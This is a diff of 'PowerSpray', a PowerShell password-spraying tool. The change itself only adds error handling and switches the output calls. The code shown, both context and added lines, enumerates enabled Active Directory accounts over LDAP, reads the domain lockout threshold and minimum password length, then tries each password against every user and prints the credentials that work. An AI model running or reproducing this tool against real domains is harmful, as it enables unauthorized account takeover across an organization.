@@ -54,24 +54,29 @@ function PowerSpray {
 	[int]$Sleep
     )
 
-    $objPDC = [ADSI] "LDAP://$([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PDCRoleOwner)";
-    $Searcher = New-Object DirectoryServices.DirectorySearcher;
-    $Searcher.Filter = '(&(objectCategory=Person)(sAMAccountName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))';
-    $Searcher.PageSize = 1000;
-    $Searcher.PropertiesToLoad.Add("sAMAccountName") > $Null
-    $Searcher.SearchRoot = $objPDC;
-    $UserList = $Searcher.FindAll().Properties.samaccountname
+     Try {
+        $objPDC = [ADSI] "LDAP://$([System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain().PDCRoleOwner)";
+        $Searcher = New-Object DirectoryServices.DirectorySearcher;
+        $Searcher.Filter = '(&(objectCategory=Person)(sAMAccountName=*)(!(userAccountControl:1.2.840.113556.1.4.803:=2)))';
+        $Searcher.PageSize = 1000;
+        $Searcher.PropertiesToLoad.Add("sAMAccountName") > $Null
+        $Searcher.SearchRoot = $objPDC;
+        $UserList = $Searcher.FindAll().Properties.samaccountname
+    } Catch {
+        Write-Output "[-] Failed to find or connect to Active Directory; the script will exit."
+        Break
+    }
 
     if (([string]::IsNullOrEmpty($UserList))) {
-        Write-Host "[-] Failed to retrieve the usernames from Active Directory; the script will exit."
-        exit
+        Write-Output "[-] Failed to retrieve the usernames from Active Directory; the script will exit."
+        Break
     } else {
         $UserCount = ($UserList).Count
-        Write-Host "[+] Successfully collected $UserCount usernames from Active Directory."
+        Write-Output "[+] Successfully collected $UserCount usernames from Active Directory."
 	$lockoutThreshold = [int]$objPDC.lockoutThreshold.Value
-        Write-Host "[*] The Lockout Threshold for the current domain is $($lockoutThreshold)."
+        Write-Output "[*] The Lockout Threshold for the current domain is $($lockoutThreshold)."
 	$minPwdLength = [int]$objPDC.minPwdLength.Value
-        Write-Host "[*] The Min Password Length for the current domain is $($minPwdLength)."
+        Write-Output "[*] The Min Password Length for the current domain is $($minPwdLength)."
     }
 
     if ($PSBoundParameters.ContainsKey('PasswordList')) {
@@ -90,29 +95,29 @@ function PowerSpray {
                 }
             }
         }
-	Write-Host "[+] Successfully generated a list of $($PasswordList.Count) passwords."
+	Write-Output "[+] Successfully generated a list of $($PasswordList.Count) passwords."
     }
 
-    Write-Host "[*] Starting password spraying operations."
+    Write-Output "[*] Starting password spraying operations."
     foreach ($Password in $PasswordList)
     {
-        Write-Host "[*] Using password $Password"
+        Write-Output "[*] Using password $Password"
         foreach ($UserName in $UserList)
         {
             $CurrentDomain = "LDAP://" + ([ADSI]"").distinguishedName;
             if (([string]::IsNullOrEmpty($CurrentDomain)))
             {
-                Write-Host "[-] Failed to retrieve the domain name; the script will exit."
-                exit
+                Write-Output "[-] Failed to retrieve the domain name; the script will exit."
+                Break
             }
 
             $Domain = New-Object System.DirectoryServices.DirectoryEntry($CurrentDomain, $UserName, $Password)
 
             if ($Domain.Name -eq $null)
             {
-                # Write-Host "[-] Authentication failed with $UserName::$Password"
+                # Write-Output "[-] Authentication failed with $UserName::$Password"
             } else {
-                Write-Host "[+] Successfully authenticated with $UserName::$Password"
+                Write-Output "[+] Successfully authenticated with $UserName::$Password"
             }
             
             if ($PSBoundParameters.ContainsKey('Delay')) {
@@ -121,13 +126,13 @@ function PowerSpray {
                 Start-Sleep -Milliseconds 1000
             }
         }
-        Write-Host "[*] Completed all rounds with password $Password"
+        Write-Output "[*] Completed all rounds with password $Password"
         
         if ($PSBoundParameters.ContainsKey('Sleep')) {
             $Duration = (New-Timespan -Minutes $Sleep).TotalSeconds
-            Write-Host "[*] Now the script will sleep for $Duration seconds."
+            Write-Output "[*] Now the script will sleep for $Duration seconds."
             Start-Sleep -Seconds $Duration
         }
     }
-    Write-Host "[*] Completed all password spraying operations."
+    Write-Output "[*] Completed all password spraying operations."
 }
